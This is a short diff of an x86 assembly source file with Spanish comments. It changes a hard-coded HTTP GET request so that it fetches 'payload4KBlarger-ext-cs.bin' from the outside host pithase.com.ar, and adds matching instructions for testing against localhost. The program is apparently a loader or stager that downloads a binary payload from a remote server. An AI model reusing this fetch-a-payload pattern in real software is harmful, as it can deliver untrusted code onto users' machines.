@@ -33,8 +33,8 @@
 ;===============================================================================================================================================================
 ; Para probarlo en local se deben hacer los siguientes cambios:
 ;
-;        http_get db "GET /bin/payload4KBlarger-ext.bin HTTP/1.1", 0x0D, 0x0A
-; por -> http_get db "GET /payload4KBlarger-ext.bin HTTP/1.1", 0x0D, 0x0A
+;        http_get db "GET /bin/payload4KBlarger-ext-cs.bin HTTP/1.1", 0x0D, 0x0A
+; por -> http_get db "GET /payload4KBlarger-ext-cs.bin HTTP/1.1", 0x0D, 0x0A
 ;
 ;        db "Host: pithase.com.ar", 0x0D, 0x0A
 ; por -> db "Host: localhost", 0x0D, 0x0A
@@ -60,7 +60,7 @@
 ;===============================================================================================================================================================
 
 section .rodata
-    http_get db "GET /bin/payload4KBlarger-ext.bin HTTP/1.1", 0x0D, 0x0A
+    http_get db "GET /bin/payload4KBlarger-ext-cs.bin HTTP/1.1", 0x0D, 0x0A
              db "Host: pithase.com.ar", 0x0D, 0x0A
              db "Connection: close", 0x0D, 0x0A
              db 0x0D, 0x0A, 0
